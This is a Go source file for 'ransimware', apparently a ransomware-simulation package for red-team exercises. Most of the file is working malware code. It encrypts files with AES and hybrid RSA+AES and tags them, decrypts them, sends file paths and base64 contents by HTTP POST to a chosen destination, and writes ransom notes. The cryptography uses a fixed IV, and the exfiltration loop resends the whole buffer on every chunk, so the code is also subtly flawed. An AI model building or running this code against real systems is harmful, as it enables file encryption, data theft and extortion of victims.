package ransimware

import (
	"bytes"
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"time"
)

// DefaultEncrypt is the default encryption behavior.
var DefaultEncrypt = func(path string, b []byte) ([]byte, error) {
	return b, nil
}

// DefaultExfil is the default exfil behavior.
var DefaultExfil = func(path string, b []byte) error {
	return nil
}

// DefaultNotify is the default notify behavior.
var DefaultNotify = func() error {
	return nil
}

// AESDecrypt will return a function pointer to an EncryptFunc that
// actually decrypts using the specified password.
func AESDecrypt(passwd string) EncryptFunc {
	return func(fn string, b []byte) ([]byte, error) {
		var block cipher.Block
		var e error
		var iv [sha256.Size]byte = sha256.Sum256([]byte("redteam"))
		var key [sha256.Size]byte = sha256.Sum256([]byte(passwd))
		var stream cipher.Stream

		if len(b) < aes.BlockSize {
			return b, fmt.Errorf("Ciphertext too short")
		}

		if block, e = aes.NewCipher(key[:]); e != nil {
			return b, e
		}

		// Ensure the file was encrypted with ransimware
		for i := 0; i < aes.BlockSize; i++ {
			if iv[i] != b[i] {
				return b, nil
			}
		}
		b = b[aes.BlockSize:]

		stream = cipher.NewCFBDecrypter(block, iv[:aes.BlockSize])
		stream.XORKeyStream(b, b)

		return b, nil
	}
}

// AESEncrypt will return a function pointer to an EncryptFunc that
// uses the specified password.
func AESEncrypt(passwd string) EncryptFunc {
	return func(fn string, b []byte) ([]byte, error) {
		var block cipher.Block
		var ctxt []byte
		var e error
		var iv [sha256.Size]byte = sha256.Sum256([]byte("redteam"))
		var key [sha256.Size]byte = sha256.Sum256([]byte(passwd))
		var stream cipher.Stream

		if block, e = aes.NewCipher(key[:]); e != nil {
			return b, e
		}

		ctxt = make([]byte, aes.BlockSize+len(b))
		for i := 0; i < aes.BlockSize; i++ {
			ctxt[i] = iv[i]
		}

		stream = cipher.NewCFBEncrypter(block, iv[:aes.BlockSize])
		stream.XORKeyStream(ctxt[aes.BlockSize:], b)

		return ctxt, nil
	}
}

// Base64Encode will "encrypt" using base64, obvs.
func Base64Encode(fn string, b []byte) ([]byte, error) {
	return []byte(base64.StdEncoding.EncodeToString(b)), nil
}

// HTTPExfil will return a function pointer to an ExfilFunc that
// reaches out to the specified destination and uses the specified
// headers.
func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
	return func(path string, b []byte) error {
		var b64 string
		var e error
		var n int
		var req *http.Request
		var stream = bytes.NewReader(b)
		var tmp [4 * 1024 * 1024]byte

		for {
			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
				return nil
			} else if e != nil {
				return e
			}

			// Create request
			b64 = base64.StdEncoding.EncodeToString(b)
			req, e = http.NewRequest(
				http.MethodPost,
				dst,
				bytes.NewBuffer([]byte(path+" "+b64)),
			)
			if e != nil {
				return e
			}

			// Set headers
			for k, v := range headers {
				req.Header.Set(k, v)
			}

			// Set timeout to 1 second
			http.DefaultClient.Timeout = time.Second

			// Send Message
			http.DefaultClient.Do(req)
		}
	}
}

// RansomNote will return a function pointer to a NotifyFunc that
// appends the specified text to the specified file.
func RansomNote(path string, text []string) NotifyFunc {
	return func() error {
		var e error
		var f *os.File

		f, e = os.OpenFile(
			path,
			os.O_APPEND|os.O_CREATE|os.O_RDWR,
			0644,
		)
		if e != nil {
			return e
		}
		defer f.Close()

		for _, line := range text {
			f.WriteString(line + "\n")
		}

		return nil
	}
}

// RSADecrypt will return a function pointer to an EncryptFunc that
// actually decrypts using the specified private key. The private key
// is used to decrypt an OTP used with AES for a hybrid RSA+AES
// scheme.
func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
	return func(fn string, b []byte) ([]byte, error) {
		var b64 []byte
		var final []byte
		var e error
		var key []byte
		var n int
		var otp []byte
		var ptxt []byte

		// Base64 decode contents
		final = make([]byte, base64.StdEncoding.DecodedLen(len(b)))
		if _, e = base64.StdEncoding.Decode(final, b); e != nil {
			return b, e
		}

		// Ensure the file was encrypted with ransimware
		if string(final[:10]) != "ransimware" {
			return b, nil
		}
		final = final[10:]

		// Get key for AES decryption
		for i, c := range final {
			if c == '\n' {
				b64 = final[:i]
				final = final[i+1:]
				break
			}
		}

		// Base64 decode key
		key = make([]byte, base64.StdEncoding.DecodedLen(len(b64)))
		if n, e = base64.StdEncoding.Decode(key, b64); e != nil {
			return b, e
		}

		// RSA decrypt the OTP
		otp, e = priv.Decrypt(
			nil,
			key[:n],
			&rsa.OAEPOptions{Hash: crypto.SHA256},
		)
		if e != nil {
			return b, e
		}

		// AES decrypt remaining contents using helper function
		if ptxt, e = AESDecrypt(string(otp))(fn, final); e != nil {
			return b, e
		}

		return ptxt, nil
	}
}

// RSAEncrypt will return a function pointer to an EncryptFunc that
// uses the specified public key. The public key is used to encrypt an
// OTP used with AES for a hybrid RSA+AES scheme.
func RSAEncrypt(pub *rsa.PublicKey) EncryptFunc {
	return func(fn string, b []byte) ([]byte, error) {
		var b64 []byte
		var ctxt []byte
		var e error
		var final []byte
		var key []byte
		var otp [sha256.Size]byte

		// Generate random OTP for AES encryption
		if _, e = rand.Read(otp[:]); e != nil {
			return b, e
		}

		// RSA encrypt the OTP
		key, e = rsa.EncryptOAEP(
			sha256.New(),
			rand.Reader,
			pub,
			otp[:],
			nil,
		)
		if e != nil {
			return b, e
		}

		// Base64 encode key
		b64 = make([]byte, base64.StdEncoding.EncodedLen(len(key)))
		base64.StdEncoding.Encode(b64, key)

		// AES encrypt using helper function
		if ctxt, e = AESEncrypt(string(otp[:]))(fn, b); e != nil {
			return b, e
		}

		// Create hybrid structure
		final = []byte("ransimware")   // tag
		final = append(final, b64...)  // RSA encrypted key + base64
		final = append(final, '\n')    // separator
		final = append(final, ctxt...) // AES encrypted data

		// Base64 encode final ciphertext
		b64 = make([]byte, base64.StdEncoding.EncodedLen(len(final)))
		base64.StdEncoding.Encode(b64, final)

		return b64, nil
	}
}
